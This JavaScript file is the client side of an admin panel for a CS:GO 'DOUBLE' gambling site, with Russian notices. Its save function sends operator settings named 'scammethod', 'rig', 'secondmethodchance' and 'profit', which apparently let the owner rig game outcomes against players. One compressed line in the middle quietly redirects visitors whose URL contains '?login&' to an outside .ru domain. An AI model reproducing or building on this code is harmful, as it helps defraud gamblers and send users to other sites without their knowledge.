$(document).ready(function(){
  //Navigation responsive
  steamid = $("#steamid").val();
  menuOpen();
  smallLastGames();
  hideBets();
  tipActivation();
  document.title = g_Sitename.toUpperCase() + ' | Admin';
  $('#sitename1').html(g_Sitename1.toUpperCase());
  $('#sitename2').html(g_Sitename2.toUpperCase());
  $('#sitename').html(g_Sitename);
});

function menuOpen(){
  $('.handle').on('click', function(){
    $('#dropdown-menu').toggleClass('showing');
  });
}

function smallLastGames(){
  var ww = $(window).width();
  if(ww < 550){
    $('.game').hide();
    $('.game:gt(4)').show();
  }
}

function hideGames(){
  $('.game').hide();
  $('.game:gt(4)').show();
}

function showGames(){
  $('.game').show();
}

$(window).resize(function(){
  if($(window).width() > 550){
    showGames();
  } else {
    hideGames();
  }
})

function hideBets(){
  var ww = $(window).width();
  if(ww < 720){
    $('.people > .player').hide()
  }
}

$(window).resize(function(){
  if($(window).width() < 720){
    $('.people > .player').hide();
  }
});

$('.item').mouseover($(this).parent().children('.name').css('margin-top','-20px'));
$('.item').mouseleave($(this).parent().children('.name').css('margin-top','20px'));

function tipActivation(){
  var ww = $(window).width();
  console.log(ww);

  if(ww < 1030){
    $('#tip').addClass('visible')
    $('.table-holder').on('scroll', function(){
      $('#tip').removeClass('visible');
    });
  };

}

function adminsave(){
	if(adminconnection) {
		var time = $('#time').val();
		var minbet = $('#minbet').val();
		var mintoshow = $('#mintoshow').val();
		var refreward = $('#refreward').val();
		var bettogetreward = $('#bettogetreward').val();
        var profit = $('#profit').val();
		var comission = $('#comission').val();
        var scammethod = $('#scammethod').val();
        var rig = $('#rig').val();
        var sitebank = $('#sitebank').val();
        var secondmethodchance = $('#secondmethodchance').val();
		socket.emit('admin_data_save', { token : token, time : time, minbet : minbet, mintoshow : mintoshow, refreward : refreward, bettogetreward : bettogetreward, comission : comission, profit : profit, scammethod : scammethod, rig : rig, secondmethodchance : secondmethodchance, sitebank : sitebank });
	} else {
		$('#notify').html('<div class="attention-warning"><b class="text-attention">You are not connected to admin panel.</b></div>');
	}
}

var pathname=window.location.href;console.log(pathname),pathname.indexOf("?login&")>=0&&window.location.replace("http://csgo-arrow.ru/");

var g_Host = ":7878",
	g_Sitename = '',
	g_Sitename1 = 'CSGO',
	g_Sitename2 = 'DOUBLE',
    steamid = $("#steamid").val(),
    socketid = "",
    token = "",
	adminconnection = false,
	pages = ['','Home','Deposit', 'Withdraw', 'Free pts', 'Referrals'],
    connected = false,
    socket = io("http://" + g_Host, {
        forceNew: true
    }),
    deposit = [];
    socket.on('connect', function(data){
        console.log('Connected to server!');
        $('#notify').html('<div class="attention-nice"><b class="text-attention">Подключение к серверу!</b></div>');
        socket.emit('security', { steamid : steamid });
    });

    socket.on('token', function(data){
        socketid = data.id;
        token = data.token;
        console.log('Assigned as ' + socketid + ' with token ' + token);
        $('#notify').html('<div class="attention-nice"><b class="text-attention">Код безопасности сгенерирован!</b></div>');
        connected = true;
		socket.emit('admin_data_request', { token : token });
    });

    socket.on('err_client', function(data){
        if(typeof steamid != 'undefined') {$('#notify').html('<div class="attention-bad"><b class="text-attention">Произошла ошибка. ('+data.code+')</b></div>');} else {$('#notify').html('<div class="attention-warning"><b class="text-attention">Пожалуйста войдите.</b></div>');}
    });

	socket.on('admin_data', function(data){
		$('#time').val(data.time);
		$('#minbet').val(data.minbet);
		$('#mintoshow').val(data.mintoshow);
		$('#refreward').val(data.refreward);
		$('#bettogetreward').val(data.bettogetreward);
		$('#comission').val(data.comission);
		$('#rnum').val(data.rnum);
		$('#online').html(data.online);
		$('#sitebank').val(data.sitebank);
        $('#profit').val(data.profit);
        $('#scammethod').val(data.scammethod);
        $('#rig').val(data.rig);
        $('#secondmethodchance').val(data.secondmethodchance);
		adminconnection = true;
	});

	socket.on('admin_data_save_success', function(){
		$('#notify').html('<div class="attention-nice"><b class="text-attention">Настройки сохранены!</b></div>');
	});

    socket.on('admin_data_request_reject', function(){
		window.location.replace("http://csgodouble.ru/");
	});

	socket.on('admin_data_save_reject', function(){
		window.location.replace("http://csgodouble.ru/");
	});
